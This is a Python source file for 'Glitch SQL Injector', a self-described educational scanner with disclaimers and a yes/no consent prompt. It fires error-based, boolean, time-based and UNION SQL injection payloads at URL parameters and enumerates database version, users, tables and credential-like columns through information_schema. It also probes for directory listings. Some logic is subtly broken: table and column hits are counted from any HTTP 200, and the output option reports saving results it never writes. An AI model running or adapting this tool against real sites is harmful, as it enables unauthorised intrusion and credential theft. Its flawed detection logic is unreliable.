#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Glitch SQL Injector - Educational SQL Injection Testing Tool
===========================================================
This tool is designed for educational purposes only.
It should only be used on systems you own or have explicit permission to test.
Unauthorized use may violate local, state, and federal laws.

Author: Glitch Security Team
Version: 1.0
"""

import argparse
import requests
import sys
import json
import time
from urllib.parse import urljoin, urlparse
import re
import os
from datetime import datetime

class GlitchSQLInjector:
    def __init__(self, config_file="config.json"):
        # Load configuration
        self.config = self.load_config(config_file)
        
        self.session = requests.Session()
        self.session.headers.update(self.config["settings"]["headers"])
        self.session.headers.update({'User-Agent': self.config["settings"]["user_agent"]})
        self.results = []
    
    def load_config(self, config_file):
        """Load configuration from JSON file"""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            print(f"[!] Configuration file {config_file} not found. Using default settings.")
            # Return default configuration
            return {
                "settings": {
                    "timeout": 10,
                    "max_redirects": 5,
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "keep-alive",
                    },
                    "test_payloads": [
                        "'",
                        "';",
                        "''",
                        "--",
                        "#",
                        "' OR '1'='1",
                        "' OR '1'='1' --",
                        "' UNION SELECT NULL --",
                        "' AND 1=1 --",
                        "' AND 1=2 --"
                    ],
                    "error_patterns": [
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_",
                        r"valid MySQL result",
                        r"MySqlClient\.",
                        r"PostgreSQL.*ERROR",
                        r"Warning.*pg_",
                        r"valid PostgreSQL result",
                        r"Npgsql\.",
                        r"Driver.*SQL SERVER",
                        r"OLE DB.*SQL SERVER",
                        r"SQL Server.*Driver",
                        r"Warning.*mssql_",
                        r"Microsoft OLE DB Provider for ODBC Drivers",
                        r"Microsoft OLE DB Provider for SQL Server",
                        r"Unclosed quotation mark after the character string",
                        r"ODBC SQL Server Driver",
                        r"ODBC Driver.*for SQL Server",
                        r"Oracle.*Driver",
                        r"Oracle error",
                        r"quoted string not properly terminated",
                        r"JET Database Engine",
                        r"Access Database Engine",
                        r"ODBC Microsoft Access Driver"
                    ],
                    "common_directories": [
                        "admin/",
                        "backup/",
                        "database/",
                        "config/",
                        "includes/",
                        "temp/",
                        "logs/",
                        "cache/",
                        "uploads/",
                        "files/",
                        "old/",
                        "new/",
                        "test/",
                        "dev/",
                        "staging/",
                        "sql/",
                        "data/",
                        "scripts/",
                        "lib/",
                        "src/"
                    ]
                }
            }
        
    def check_url_accessibility(self, url):
        """Check if the target URL is accessible"""
        try:
            response = self.session.get(url, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"[!] Error accessing URL: {str(e)}")
            return False
    
    def test_basic_injection(self, base_url, param_name, param_value):
        """Test for basic SQL injection vulnerability"""
        # Test payloads for SQL injection
        test_payloads = self.config["settings"]["test_payloads"]
        
        vulnerable = False
        detected_payload = ""
        
        print(f"[+] Testing parameter '{param_name}' for SQL injection...")
        
        for payload in test_payloads:
            test_url = f"{base_url}?{param_name}={param_value}{payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Check for common SQL error messages
                error_patterns = self.config["settings"]["error_patterns"]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] Potential SQL injection vulnerability detected!")
                        print(f"    Payload: {payload}")
                        print(f"    URL: {test_url}")
                        vulnerable = True
                        detected_payload = payload
                        break
                
                if vulnerable:
                    break
                    
            except Exception as e:
                print(f"[-] Error testing payload '{payload}': {str(e)}")
        
        return vulnerable, detected_payload
    
    def test_boolean_based_injection(self, base_url, param_name, param_value):
        """Test for boolean-based blind SQL injection"""
        print(f"[+] Testing parameter '{param_name}' for boolean-based SQL injection...")
        
        # Test true and false conditions
        true_payload = f" AND 1=1"
        false_payload = f" AND 1=2"
        
        true_url = f"{base_url}?{param_name}={param_value}{true_payload}"
        false_url = f"{base_url}?{param_name}={param_value}{false_payload}"
        
        try:
            response_true = self.session.get(true_url, timeout=10)
            response_false = self.session.get(false_url, timeout=10)
            
            # If responses are different, there might be a boolean-based vulnerability
            if response_true.status_code != response_false.status_code:
                print(f"[+] Potential boolean-based SQL injection vulnerability detected!")
                print(f"    True condition: {true_url}")
                print(f"    False condition: {false_url}")
                return True, "AND 1=1/1=2"
            elif len(response_true.text) != len(response_false.text):
                print(f"[+] Potential boolean-based SQL injection vulnerability detected (different response lengths)!" )
                print(f"    True condition: {true_url}")
                print(f"    False condition: {false_url}")
                return True, "AND 1=1/1=2"
            else:
                print(f"[-] No obvious boolean-based vulnerability detected")
                return False, ""
        
        except Exception as e:
            print(f"[-] Error testing boolean-based injection: {str(e)}")
            return False, ""
    
    def test_time_based_injection(self, base_url, param_name, param_value):
        """Test for time-based blind SQL injection"""
        print(f"[+] Testing parameter '{param_name}' for time-based SQL injection...")
        
        # Time-based payloads
        time_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5);--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a);--",
            "' AND IF(1=1,SLEEP(5),0);--"
        ]
        
        for payload in time_payloads:
            test_url = f"{base_url}?{param_name}={param_value}{payload}"
            
            start_time = time.time()
            try:
                response = self.session.get(test_url, timeout=10)
                end_time = time.time()
                
                # If response took significantly longer, there might be a time-based vulnerability
                if end_time - start_time > 4:  # Allow 1 second buffer
                    print(f"[+] Potential time-based SQL injection vulnerability detected!")
                    print(f"    Payload: {payload}")
                    print(f"    URL: {test_url}")
                    print(f"    Response time: {end_time - start_time:.2f}s")
                    return True, payload
            except Exception as e:
                print(f"[-] Error testing time-based injection with payload '{payload}': {str(e)}")
        
        print(f"[-] No time-based vulnerability detected")
        return False, ""
    
    def test_union_based_injection(self, base_url, param_name, param_value):
        """Test for union-based SQL injection"""
        print(f"[+] Testing parameter '{param_name}' for union-based SQL injection...")
        
        # First, try to determine the number of columns
        for i in range(1, 20):
            order_by_payload = f"' ORDER BY {i}--"
            test_url = f"{base_url}?{param_name}={param_value}{order_by_payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # If we get an error, we've likely exceeded the number of columns
                if "error" in response.text.lower() or response.status_code == 500:
                    column_count = i - 1
                    print(f"[+] Estimated column count: {column_count}")
                    
                    # Now try union-based injection
                    union_columns = ["NULL"] * column_count
                    for j in range(column_count):
                        union_columns[j] = "'a'"  # Try with string value
                        union_payload = f"' UNION SELECT {','.join(union_columns)}--"
                        
                        test_url = f"{base_url}?{param_name}={param_value}{union_payload}"
                        response = self.session.get(test_url, timeout=10)
                        
                        if response.status_code != 500 and "error" not in response.text.lower():
                            print(f"[+] Potential union-based SQL injection vulnerability detected!")
                            print(f"    Payload: {union_payload}")
                            print(f"    URL: {test_url}")
                            return True, union_payload
                        
                        union_columns[j] = "NULL"  # Reset to NULL
                    
                    break
            except Exception as e:
                print(f"[-] Error determining column count: {str(e)}")
                continue
        
        print(f"[-] No union-based vulnerability detected")
        return False, ""
    
    def extract_database_info(self, base_url, param_name, param_value, vuln_type, payload):
        """Extract database information using the identified vulnerability"""
        print(f"[*] Attempting to extract database information...")
        
        info_queries = {
            "mysql_version": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "database_name": "' UNION SELECT 1,@@version,3--",
            "current_user": "' UNION SELECT 1,USER(),3--",
            "server_name": "' UNION SELECT 1,@@SERVERNAME,3--",
            "database_version": "' UNION SELECT 1,version(),3--",
            "current_database": "' UNION SELECT 1,database(),3--",
            "user": "' UNION SELECT 1,user(),3--",
            "system_user": "' UNION SELECT 1,system_user(),3--",
            "hostname": "' UNION SELECT 1,@@hostname,3--",
            "database_user": "' UNION SELECT 1,@@user,3--",
            "schema_name": "' UNION SELECT 1,schema_name(),3--",
        }
        
        extracted_info = {}
        
        for info_type, query in info_queries.items():
            test_url = f"{base_url}?{param_name}={param_value}{query}"
            
            try:
                start_time = time.time()
                response = self.session.get(test_url, timeout=10)
                end_time = time.time()
                
                if end_time - start_time > 4:
                    extracted_info[info_type] = f"Available (delay: {end_time - start_time:.2f}s)"
                    print(f"[+] {info_type}: Available")
                else:
                    print(f"[-] {info_type}: Not available")
            except Exception as e:
                print(f"[-] Error extracting {info_type}: {str(e)}")
        
        return extracted_info
    
    def enumerate_tables(self, base_url, param_name, param_value):
        """Enumerate database tables"""
        print(f"[*] Attempting to enumerate database tables...")
        
        # Common table names to check
        common_tables = [
            "users", "admin", "login", "accounts", "members", 
            "customers", "employees", "products", "orders", 
            "config", "settings", "sessions", "logs"
        ]
        
        found_tables = []
        
        for table_name in common_tables:
            # Try using information_schema to check if table exists
            payload = f"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='{table_name}')>0--"
            test_url = f"{base_url}?{param_name}={param_value}{payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Check if the response indicates the table exists
                if response.status_code == 200 and len(response.text) > 0:
                    # This is a simplified check - in a real scenario, we'd need to analyze the response more carefully
                    print(f"[+] Potential table found: {table_name}")
                    found_tables.append(table_name)
            except Exception as e:
                print(f"[-] Error checking table '{table_name}': {str(e)}")
        
        return found_tables
    
    def enumerate_columns(self, base_url, param_name, param_value, table_name):
        """Enumerate columns in a specific table"""
        print(f"[*] Attempting to enumerate columns in table '{table_name}'...")
        
        # Common column names to check
        common_columns = [
            "id", "username", "password", "email", "user", "pass", 
            "login", "name", "first_name", "last_name", "admin", 
            "user_id", "email_address", "phone", "address", "data",
            "content", "description", "title", "user_name", "pwd"
        ]
        
        found_columns = []
        
        for column_name in common_columns:
            # Try using information_schema to check if column exists
            payload = f"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table_name}' AND column_name='{column_name}')>0--"
            test_url = f"{base_url}?{param_name}={param_value}{payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200 and len(response.text) > 0:
                    print(f"[+] Potential column found in {table_name}: {column_name}")
                    found_columns.append(column_name)
            except Exception as e:
                print(f"[-] Error checking column '{column_name}' in table '{table_name}': {str(e)}")
        
        return found_columns
    
    def enumerate_database_info(self, base_url, param_name, param_value):
        """Attempt to gather database information (ethically)"""
        print("[*] Attempting to gather database information...")
        
        # These are safe information gathering techniques
        info_payloads = {
            "MySQL Version": "')) OR (SELECT SLEEP(5))--",
            "Database Name": "')) OR (SELECT SLEEP(5))--",
            "User Info": "')) OR (SELECT SLEEP(5))--"
        }
        
        info_results = {}
        
        for name, payload in info_payloads.items():
            test_url = f"{base_url}?{param_name}={param_value}{payload}"
            start_time = time.time()
            
            try:
                response = self.session.get(test_url, timeout=10)
                end_time = time.time()
                
                # If response takes significantly longer, there might be a delay-based vulnerability
                if end_time - start_time > 5:
                    info_results[name] = "Possible vulnerability detected"
                    print(f"[+] {name}: Possible vulnerability detected")
                else:
                    print(f"[-] {name}: No obvious vulnerability detected")
                    
            except Exception as e:
                print(f"[-] Error testing {name}: {str(e)}")
        
        return info_results
    
    def scan_directory_listing(self, base_url):
        """Scan for directory listing vulnerabilities"""
        print("[*] Scanning for directory listing vulnerabilities...")
        
        common_directories = self.config["settings"]["common_directories"]
        
        accessible_dirs = []
        
        for directory in common_directories:
            dir_url = urljoin(base_url, directory)
            try:
                response = self.session.get(dir_url, timeout=10)
                
                # Check for directory listing (common indicators)
                if response.status_code == 200:
                    if "Index of /" in response.text or "Directory Listing For" in response.text:
                        print(f"[+] Directory listing found: {dir_url}")
                        accessible_dirs.append(dir_url)
                    elif "Parent Directory" in response.text:
                        print(f"[+] Directory listing found: {dir_url}")
                        accessible_dirs.append(dir_url)
            except Exception as e:
                print(f"[-] Error accessing {dir_url}: {str(e)}")
        
        return accessible_dirs
    
    def run_scan(self, target_url):
        """Run a complete scan on the target URL"""
        self.print_terminal_header()
        print(f"Target: {target_url}")
        print(f"Scan started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("-"*60)
        
        # Check if URL is accessible
        if not self.check_url_accessibility(target_url):
            print("[!] Target URL is not accessible. Exiting.")
            return
        
        # Parse URL to extract parameters
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parsed.query
        
        print(f"[+] Base URL: {base_url}")
        print(f"[+] Parameters: {params}")
        
        # If there are parameters, test them
        if params:
            # Simple parameter parsing (for demonstration)
            param_pairs = params.split('&')
            for pair in param_pairs:
                if '=' in pair:
                    param_name, param_value = pair.split('=', 1)
                    print(f"\n[*] Testing parameter: {param_name}")
                    
                    # Test for SQL injection using multiple techniques
                    print(f"\n[*] Testing parameter '{param_name}' with multiple techniques...")
                    
                    # 1. Basic error-based injection
                    basic_vulnerable, basic_payload = self.test_basic_injection(base_url, param_name, param_value)
                    
                    # 2. Boolean-based injection
                    bool_vulnerable, bool_payload = self.test_boolean_based_injection(base_url, param_name, param_value)
                    
                    # 3. Time-based injection
                    time_vulnerable, time_payload = self.test_time_based_injection(base_url, param_name, param_value)
                    
                    # 4. Union-based injection
                    union_vulnerable, union_payload = self.test_union_based_injection(base_url, param_name, param_value)
                    
                    # Consolidate results
                    if basic_vulnerable or bool_vulnerable or time_vulnerable or union_vulnerable:
                        print(f"[+] Vulnerability confirmed for parameter '{param_name}'!")
                        if basic_vulnerable:
                            print(f"    Basic injection payload: {basic_payload}")
                        if bool_vulnerable:
                            print(f"    Boolean injection payload: {bool_payload}")
                        if time_vulnerable:
                            print(f"    Time-based injection payload: {time_payload}")
                        if union_vulnerable:
                            print(f"    Union-based injection payload: {union_payload}")
                        
                        # If vulnerable, try to gather more information
                        if basic_vulnerable:
                            db_info = self.extract_database_info(base_url, param_name, param_value, "basic", basic_payload)
                        elif time_vulnerable:
                            db_info = self.extract_database_info(base_url, param_name, param_value, "time", time_payload)
                        elif union_vulnerable:
                            db_info = self.extract_database_info(base_url, param_name, param_value, "union", union_payload)
                        
                        # If any vulnerability found, try to enumerate tables and columns
                        if basic_vulnerable or time_vulnerable or union_vulnerable:
                            print(f"\n[*] Enumerating database tables...")
                            found_tables = self.enumerate_tables(base_url, param_name, param_value)
                            
                            if found_tables:
                                print(f"[+] Found {len(found_tables)} potential tables")
                                for table in found_tables:
                                    print(f"    Table: {table}")
                                    
                                    # Try to enumerate columns for each found table
                                    found_columns = self.enumerate_columns(base_url, param_name, param_value, table)
                                    if found_columns:
                                        print(f"      Found {len(found_columns)} columns: {', '.join(found_columns)}")
                    else:
                        print(f"[-] No obvious vulnerability found for parameter '{param_name}' using multiple testing techniques")
        else:
            print("[!] No parameters found in URL. SQL injection testing requires parameters.")
            print("[*] Example: http://example.com/page.php?id=1")
        
        # Scan for directory listing vulnerabilities
        dir_results = self.scan_directory_listing(base_url)
        
        print("\n" + "="*60)
        print("SCAN COMPLETED")
        print("="*60)
        print(f"Scan finished at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        if dir_results:
            print(f"Directory listing vulnerabilities found: {len(dir_results)}")
            for dir_url in dir_results:
                print(f"  - {dir_url}")
        else:
            print("No directory listing vulnerabilities found.")
    
    def print_terminal_header(self):
        """Print a terminal-style header"""
        print("\033[92m")  # Green color
        print("  ╔══════════════════════════════════════════════════════════════╗")
        print("  ║     GLİTCH SQL INJECTOR  ___  _  _  ___                      ║")
        print("  ║                   | |   / _ \\| || ||__ \\                     ║")
        print("  ║                   | |  | | | | || |_  ) |                    ║")
        print("  ║                   | |  | | | |__   _/ /                      ║")
        print("  ║                   | |__| |_| |  | |/ /_                      ║")
        print("  ║                   |_____\\___/   |_|____|                     ║")
        print("  ║                                                              ║")
        print("  ║   ██████╗ ██╗   ██╗██████╗ ███████╗██████╗                   ║")
        print("  ║  ██╔════╝ ██║   ██║██╔══██╗██╔════╝██╔══██╗                  ║")
        print("  ║  ██║      ██║   ██║██████╔╝█████╗  ██████╔╝                  ║")
        print("  ║  ██║      ██║   ██║██╔══██╗██╔══╝  ██╔══██╗                  ║")
        print("  ║  ╚██████╗ ╚██████╔╝██████╔╝███████╗██║  ██║                  ║")
        print("  ║   ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                  ║")
        print("  ║                                                              ║")
        print("  ║  ██████╗ ██████╗  ██████╗ ██╗   ██╗███████╗██████╗           ║")
        print("  ║  ██╔══██╗██╔══██╗██╔═══██╗██║   ██║██╔════╝██╔══██╗          ║")
        print("  ║  ██████╔╝██████╔╝██║   ██║██║   ██║█████╗  ██████╔╝          ║")
        print("  ║  ██╔═══╝ ██╔══██╗██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗          ║")
        print("  ║  ██║     ██║  ██║╚██████╔╝ ╚████╔╝ ███████╗██║  ██║          ║")
        print("  ║  ╚═╝     ╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝          ║")
        print("  ╚══════════════════════════════════════════════════════════════╝")
        print("\033[0m")  # Reset color
        print("\033[95m" + "="*60 + "\033[0m")
        print("\033[95mGLITCH SQL INJECTOR - ETHICAL TESTING MODE\033[0m")

def print_help():
    print("\n\033[94mGLITCH SQL INJECTOR - COMMANDS\033[0m")
    print("-"*40)
    print("scan <url>     - Scan a target URL for SQL injection vulnerabilities")
    print("help           - Show this help message")
    print("exit/quit      - Exit the tool")
    print("-"*40)
    print("\033[91mWARNING: This tool is for educational purposes only.\033[0m")
    print("\033[91mOnly use on systems you own or have explicit permission to test.\033[0m")

def main():
    print("\033[92m")  # Green color
    print("  ╔══════════════════════════════════════════════════════════════╗")
    print("  ║                glitch    _     ___  _  _  ___                ║")
    print("  ║                   | |   / _ \\| || ||__ \\                     ║")
    print("  ║                   | |  | | | | || |_  ) |                    ║")
    print("  ║                   | |  | | | |__   _/ /                      ║")
    print("  ║                   | |__| |_| |  | |/ /_                      ║")
    print("  ║                   |_____\\___/   |_|____|                     ║")
    print("  ║                                                              ║")
    print("  ║   ██████╗ ██╗   ██╗██████╗ ███████╗██████╗                   ║")
    print("  ║  ██╔════╝ ██║   ██║██╔══██╗██╔════╝██╔══██╗                  ║")
    print("  ║  ██║      ██║   ██║██████╔╝█████╗  ██████╔╝                  ║")
    print("  ║  ██║      ██║   ██║██╔══██╗██╔══╝  ██╔══██╗                  ║")
    print("  ║  ╚██████╗ ╚██████╔╝██████╔╝███████╗██║  ██║                  ║")
    print("  ║   ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                  ║")
    print("  ║                                                              ║")
    print("  ║  ██████╗ ██████╗  ██████╗ ██╗   ██╗███████╗██████╗           ║")
    print("  ║  ██╔══██╗██╔══██╗██╔═══██╗██║   ██║██╔════╝██╔══██╗          ║")
    print("  ║  ██████╔╝██████╔╝██║   ██║██║   ██║█████╗  ██████╔╝          ║")
    print("  ║  ██╔═══╝ ██╔══██╗██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗          ║")
    print("  ║  ██║     ██║  ██║╚██████╔╝ ╚████╔╝ ███████╗██║  ██║          ║")
    print("  ║  ╚═╝     ╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝          ║")
    print("  ╚══════════════════════════════════════════════════════════════╝")
    print("\033[0m")  # Reset color
    print("\033[95m" + "="*60 + "\033[0m")
    print("\033[95mGLITCH SQL INJECTOR - ETHICAL TESTING MODE\033[0m")
    print("\033[95m" + "="*60 + "\033[0m")
    print("Educational SQL Injection Testing Tool")
    print("Use only on systems you own or have explicit permission to test!\n")
    
    # Check if running in interactive mode
    if len(sys.argv) == 1:
        # Interactive mode
        print("\033[93mInteractive Mode - Enter 'help' for commands, 'exit' to quit\033[0m")
        while True:
            try:
                command = input("\n\033[92mGLITCH-SQL> \033[0m").strip()
                
                if command.lower() in ['exit', 'quit']:
                    print("Exiting Glitch SQL Injector. Stay ethical!")
                    break
                elif command.lower() == 'help':
                    print_help()
                    continue
                elif command.lower().startswith('scan '):
                    target_url = command[5:].strip()  # Get URL after 'scan '
                    if not target_url:
                        print("Usage: scan <target_url>")
                        continue
                    
                    # Validate URL format
                    if not target_url.startswith(('http://', 'https://')):
                        print("[!] Please enter a valid URL starting with http:// or https://")
                        continue
                    
                    # Check consent
                    consent = input("Do you confirm you have permission to test this system? (yes/no): ")
                    if consent.lower() != 'yes':
                        print("[-] User did not confirm permission. Skipping scan.")
                        continue
                    
                    # Run the scan
                    injector = GlitchSQLInjector()
                    injector.run_scan(target_url)
                elif command.strip() == '':
                    continue
                else:
                    print(f"Unknown command: {command}. Type 'help' for available commands.")
            except KeyboardInterrupt:
                print("\n\nExiting Glitch SQL Injector. Stay ethical!")
                break
            except EOFError:
                print("\n\nExiting Glitch SQL Injector. Stay ethical!")
                break
    else:
        # Command line mode
        parser = argparse.ArgumentParser(description='Glitch SQL Injector - Ethical SQL Injection Testing Tool')
        parser.add_argument('url', help='Target URL to test for SQL injection vulnerabilities')
        parser.add_argument('--output', '-o', help='Output results to file')
        
        args = parser.parse_args()
        
        # Warning message
        print("[WARNING] This tool is for educational purposes only!")
        print("[WARNING] Only use on systems you own or have explicit permission to test!")
        print("[WARNING] Unauthorized use may violate local, state, and federal laws.\n")
        
        consent = input("Do you confirm you have permission to test this system? (yes/no): ")
        if consent.lower() != 'yes':
            print("[-] User did not confirm permission. Exiting.")
            sys.exit(1)
        
        # Create injector instance and run scan
        injector = GlitchSQLInjector()
        injector.run_scan(args.url)
        
        if args.output:
            print(f"[+] Results saved to: {args.output}")

if __name__ == "__main__":
    main()